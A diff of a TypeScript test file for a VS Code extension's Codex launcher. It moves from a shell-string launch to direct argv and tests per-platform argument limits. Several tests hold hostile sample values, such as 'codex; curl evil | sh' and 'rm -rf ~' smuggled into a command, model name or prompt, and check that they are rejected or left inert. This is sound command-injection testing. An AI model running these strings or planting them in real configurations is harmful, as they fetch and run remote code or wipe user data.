@@ -131,11 +131,17 @@ vi.mock("../../src/services/RepositoryContextLoader", () => ({
 }));
 
 import {
-  buildCodexInteractiveLaunchCommand,
+  buildCodexInteractiveLaunch,
+  codexPromptArgLimit,
+  environmentArgBytes,
+  DARWIN_ARG_MAX,
+  LINUX_MAX_ARG_STRLEN,
   runStageSkillInteractive,
   killAllActiveProcesses,
 } from "../../src/utils/skillRunner";
 import * as vscode from "vscode";
+import * as fs from "fs";
+import * as path from "node:path";
 
 const vscodeHooks = vscode as unknown as {
   __terminal: {
@@ -147,70 +153,153 @@ const vscodeHooks = vscode as unknown as {
   __closeListeners: Array<(t: unknown) => void>;
 };
 const mockTerminal = vscodeHooks.__terminal;
-/** Simulate the VSCode terminal closing (the `; exit` path) with an exit code. */
+/** Simulate the VSCode terminal closing (Codex exited) with an exit code. */
 function closeTerminal(code: number | undefined): void {
   mockTerminal.exitStatus = code === undefined ? undefined : { code };
   for (const cb of vscodeHooks.__closeListeners) cb(mockTerminal);
 }
 
-describe("buildCodexInteractiveLaunchCommand (#4024)", () => {
-  it("decodes into a var, rm's the temp file, launches codex, then exits", () => {
-    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/codex-abc.b64");
-    expect(cmd).toBe(
-      `P="$(openssl base64 -d -A -in '/tmp/codex-abc.b64')"; ` +
-        `rm -f '/tmp/codex-abc.b64'; ` +
-        `codex --model gpt-5.4 "$P"; exit`
-    );
+/**
+ * The largest prompt any pipeline stage can render, bounded from above by every
+ * byte the renderer could compose it from: the stage's whole skill directory
+ * plus the whole shared tree. Measured on 2026-10-01 the largest rendered
+ * stage (pr-merge) was 155,121 bytes; this bound is larger than any of them.
+ */
+async function largestStagePromptUpperBound(): Promise<number> {
+  // `fs` is mocked for the runner; measure with the real one.
+  const fsReal = await vi.importActual<typeof import("fs")>("fs");
+  const skillsRoot = path.join(__dirname, "..", "..", "..", "..", "skills");
+  const dirBytes = (dir: string): number =>
+    fsReal.readdirSync(dir, { withFileTypes: true }).reduce((sum, entry) => {
+      const full = path.join(dir, entry.name);
+      return sum + (entry.isDirectory() ? dirBytes(full) : fsReal.statSync(full).size);
+    }, 0);
+  const stages = [
+    "issue-pickup",
+    "feature-planning",
+    "feature-dev",
+    "feature-validate",
+    "pr-create",
+    "pr-merge",
+  ];
+  const shared = dirBytes(path.join(skillsRoot, "_shared"));
+  return (
+    Math.max(...stages.map((st) => dirBytes(path.join(skillsRoot, `nightgauge-${st}`)))) + shared
+  );
+}
+
+describe("buildCodexInteractiveLaunch (#4024, #2321)", () => {
+  const darwin = { platform: "darwin" as const, envBytes: 8192 };
+
+  it("passes the prompt as one argv string to codex, with no shell", () => {
+    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", "do the thing", darwin);
+    expect(launch).toEqual({
+      shellPath: "codex",
+      shellArgs: ["--model", "gpt-5.4", "do the thing"],
+    });
   });
 
-  it("ends in `; exit` so the terminal closes on Codex exit (#1) and rm's the seed file (#2)", () => {
-    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/p.b64");
-    expect(cmd.endsWith("; exit")).toBe(true);
-    expect(cmd).toContain("rm -f '/tmp/p.b64'");
+  it("involves no shell string, base64 step or temp file for a normal prompt", () => {
+    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", "prompt", darwin);
+    const flat = JSON.stringify(launch);
+    expect(flat).not.toMatch(/base64|openssl|rm -f|; exit/);
+    expect(launch.promptFile).toBeUndefined();
   });
 
   it("omits the --model flag when no model is given", () => {
-    const cmd = buildCodexInteractiveLaunchCommand("codex", undefined, "/tmp/p.b64");
-    expect(cmd).toContain(`codex "$P"; exit`);
-    expect(cmd).not.toContain("--model");
+    const launch = buildCodexInteractiveLaunch("codex", undefined, "p", darwin);
+    expect(launch.shellArgs).toEqual(["p"]);
   });
 
   it("honors a custom codex CLI command", () => {
-    const cmd = buildCodexInteractiveLaunchCommand("/opt/codex", "gpt-5.5", "/tmp/p.b64");
-    expect(cmd).toContain("/opt/codex --model gpt-5.5 ");
+    const launch = buildCodexInteractiveLaunch("/opt/codex", "gpt-5.5", "p", darwin);
+    expect(launch.shellPath).toBe("/opt/codex");
+    expect(launch.shellArgs.slice(0, 2)).toEqual(["--model", "gpt-5.5"]);
   });
 
-  it("the seed is base64 (no raw prompt content), so quotes/backticks cannot break the arg", () => {
-    // The command never embeds raw prompt text — only the b64 file path — so a
-    // prompt containing `"`/`` ` ``/`$` is inert in the shell command.
-    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/p.b64");
-    // The only ${...}-style construct is the safe "$P" expansion of decoded text.
-    expect(cmd).toContain('"$P"');
+  it("keeps quotes, backticks and $ in the prompt byte for byte", () => {
+    const prompt = "Run `git log` and \"echo $HOME\"; rm -rf ~ $(whoami) 'q'";
+    const launch = buildCodexInteractiveLaunch("codex", undefined, prompt, darwin);
+    expect(launch.shellArgs).toEqual([prompt]);
   });
 
   it("REJECTS a codexCmd with shell metacharacters (command-injection guard)", () => {
     // A malicious .nightgauge/config.yaml on a cloned repo could set this.
     expect(() =>
-      buildCodexInteractiveLaunchCommand("codex; curl evil | sh", "gpt-5.4", "/tmp/p.b64")
+      buildCodexInteractiveLaunch("codex; curl evil | sh", "gpt-5.4", "p", darwin)
     ).toThrow(/Unsafe Codex CLI command/);
-    expect(() =>
-      buildCodexInteractiveLaunchCommand("codex $(rm -rf ~)", undefined, "/tmp/p.b64")
-    ).toThrow(/Unsafe/);
-    expect(() =>
-      buildCodexInteractiveLaunchCommand("codex foo", undefined, "/tmp/p.b64")
-    ).toThrow();
+    expect(() => buildCodexInteractiveLaunch("codex $(rm -rf ~)", undefined, "p", darwin)).toThrow(
+      /Unsafe/
+    );
+    expect(() => buildCodexInteractiveLaunch("codex foo", undefined, "p", darwin)).toThrow();
   });
 
-  it("DROPS a model with shell metacharacters rather than interpolating it", () => {
-    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt; rm -rf ~", "/tmp/p.b64");
-    expect(cmd).not.toContain("rm -rf");
-    expect(cmd).not.toContain("--model");
+  it("DROPS a model with shell metacharacters rather than passing it", () => {
+    const launch = buildCodexInteractiveLaunch("codex", "gpt; rm -rf ~", "p", darwin);
+    expect(launch.shellArgs).toEqual(["p"]);
   });
 
   it("accepts an absolute path as codexCmd", () => {
     expect(() =>
-      buildCodexInteractiveLaunchCommand("/usr/local/bin/codex", "gpt-5.4", "/tmp/p.b64")
+      buildCodexInteractiveLaunch("/usr/local/bin/codex", "gpt-5.4", "p", darwin)
     ).not.toThrow();
+  });
+
+  it("derives the limit per platform: 128 KiB per string on Linux, ARG_MAX less env on macOS", () => {
+    expect(codexPromptArgLimit("linux", 999_999)).toBe(LINUX_MAX_ARG_STRLEN - 1);
+    expect(codexPromptArgLimit("darwin", 0)).toBeLessThan(DARWIN_ARG_MAX);
+    expect(codexPromptArgLimit("darwin", 100_000)).toBe(codexPromptArgLimit("darwin", 0) - 100_000);
+    expect(codexPromptArgLimit("darwin", 2 * DARWIN_ARG_MAX)).toBe(0);
+  });
+
+  it("counts the environment as KEY=value plus a NUL per entry", () => {
+    expect(environmentArgBytes({ A: "1", BC: "" })).toBe("A=1".length + 1 + "BC=".length + 1);
+  });
+
+  it("over the limit, tells Codex to read the prompt from a plain file instead", () => {
+    const prompt = "x".repeat(LINUX_MAX_ARG_STRLEN);
+    const launch = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
+      platform: "linux",
+      envBytes: 0,
+      oversizePromptPath: "/tmp/codex-interactive-abc.md",
+    });
+    expect(launch.promptFile).toEqual({ path: "/tmp/codex-interactive-abc.md", content: prompt });
+    expect(launch.shellArgs[0]).toBe("--model");
+    const seed = launch.shellArgs[2];
+    expect(seed).toContain("/tmp/codex-interactive-abc.md");
+    expect(Buffer.byteLength(seed)).toBeLessThan(1024);
+    expect(JSON.stringify(launch.shellArgs)).not.toMatch(/base64|openssl/);
+  });
+
+  it("refuses an oversize prompt when no file path is given, rather than truncating it", () => {
+    expect(() =>
+      buildCodexInteractiveLaunch("codex", undefined, "x".repeat(LINUX_MAX_ARG_STRLEN), {
+        platform: "linux",
+        envBytes: 0,
+      })
+    ).toThrow(/over the .*argument limit/);
+  });
+
+  it("the largest stage prompt fits argv on macOS and takes the file route on Linux", async () => {
+    const bound = await largestStagePromptUpperBound();
+    // Not vacuous: the bound covers the measured 155,121-byte pr-merge render.
+    expect(bound).toBeGreaterThan(155_121);
+    const prompt = "y".repeat(bound);
+    // A generous macOS environment (64 KiB) still leaves room for the prompt.
+    const mac = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
+      platform: "darwin",
+      envBytes: 65_536,
+      oversizePromptPath: "/tmp/p.md",
+    });
+    expect(mac.promptFile).toBeUndefined();
+    expect(mac.shellArgs[2]).toHaveLength(bound);
+    const linux = buildCodexInteractiveLaunch("codex", "gpt-5.4", prompt, {
+      platform: "linux",
+      envBytes: 65_536,
+      oversizePromptPath: "/tmp/p.md",
+    });
+    expect(linux.promptFile?.content).toHaveLength(bound);
+    expect(Buffer.byteLength(linux.shellArgs[2])).toBeLessThan(LINUX_MAX_ARG_STRLEN);
   });
 });
 
@@ -237,12 +326,48 @@ describe("runStageSkillInteractive - Codex TUI branch (#4024)", () => {
     expect(createArg.name).toContain("#42");
 
     expect(mockTerminal.show).toHaveBeenCalled();
-    const sent = mockTerminal.sendText.mock.calls[0][0] as string;
-    expect(sent).toContain("openssl base64 -d -A -in");
+    // Codex is the terminal's own process: no shell string is typed into it (#2321).
+    expect(mockTerminal.sendText).not.toHaveBeenCalled();
+    const launchArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as unknown as {
+      shellPath: string;
+      shellArgs: string[];
+    };
+    expect(launchArg.shellPath).toBe("codex");
     // model resolved + validated for codex (#4021)
-    expect(sent).toContain("--model");
+    expect(launchArg.shellArgs[0]).toBe("--model");
+    expect(launchArg.shellArgs.at(-1)).toContain("Execute the following pipeline skill");
+    // A normal-sized prompt writes no file.
+    expect(vi.mocked(fs.writeFileSync)).not.toHaveBeenCalled();
 
     expect(onMode).toHaveBeenCalledWith("interactive");
+  });
+
+  it("over the limit, writes the prompt 0600 for Codex to read and removes it on close", () => {
+    // An environment larger than macOS ARG_MAX leaves no room for any argv prompt.
+    const platform = Object.getOwnPropertyDescriptor(process, "platform")!;
+    Object.defineProperty(process, "platform", { value: "darwin" });
+    vi.stubEnv("NIGHTGAUGE_TEST_HUGE_ENV", "x".repeat(DARWIN_ARG_MAX));
+    try {
+      runStageSkillInteractive("feature-dev", 42, {});
+      const [file, content, opts] = vi.mocked(fs.writeFileSync).mock.calls[0] as unknown as [
+        string,
+        string,
+        { mode: number },
+      ];
+      expect(file).toMatch(/codex-interactive-.*\.md$/);
+      expect(content).toContain("Execute the following pipeline skill");
+      expect(opts.mode).toBe(0o600);
+      const launchArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as unknown as {
+        shellArgs: string[];
+      };
+      expect(launchArg.shellArgs.at(-1)).toContain(file);
+      expect(vi.mocked(fs.unlinkSync)).not.toHaveBeenCalled();
+      closeTerminal(0);
+      expect(vi.mocked(fs.unlinkSync)).toHaveBeenCalledWith(file);
+    } finally {
+      vi.unstubAllEnvs();
+      Object.defineProperty(process, "platform", platform);
+    }
   });
 
   it("returns a terminal-backed handle (no child process) that is interactive", () => {
